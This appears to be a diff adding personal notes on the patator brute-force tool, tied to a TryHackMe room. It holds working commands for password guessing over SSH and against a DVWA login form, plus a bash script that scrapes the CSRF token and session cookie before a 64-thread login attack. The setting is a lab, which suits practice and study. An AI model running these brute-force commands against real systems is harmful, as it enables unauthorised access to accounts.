@@ -1,0 +1,34 @@
+### patator ###
+## links
+https://tryhackme.com/room/bruteforceheroes
+
+
+## examples
+patator http_fuzz -h							# help on module
+
+# ssh
+patator ssh_login host=$h user=FILE0 password=FILE1 0=userlist.txt 1=pass.txt \
+  -x ignore:mesg='Authentication failed.' -x quit:mesg!='Authentication failed.'
+
+# login form
+patator http_fuzz method=POST \
+  url="http://10.10.141.154/login.php" \
+  body="username=admin&password=password&Login=Login&user_token=631188b8376173d544bc2ffff4420f15" \
+  header="Cookie: PHPSESSID=lq805gkohiamc501riahr6jltk; security=impossible" \
+  -x quit:fgrep!=login.php
+
+
+## patator script
+#!/bin/bash
+IP=10.10.141.154
+CSRF=$(curl -s -c dvwa.cookie "${IP}/login.php" | awk -F 'value=' '/user_token/ {print $2}' | cut -d "'" -f2)
+SESSIONID=$(grep PHPSESSID dvwa.cookie | awk -F ' ' '{print $7}')
+echo "The CSRF is: $CSRF"
+echo "The PHPSESSID is: $SESSIONID"
+
+patator http_fuzz method=POST --threads=64 timeout=10 \
+url="http://${IP}/login.php" \
+0=passwords.txt \
+body="username=admin&password=FILE0&Login=Login&user_token=${CSRF}" \
+header="Cookie: PHPSESSID=${SESSIONID}; security=impossible" \
+-x ignore:fgrep="Location: login.php"
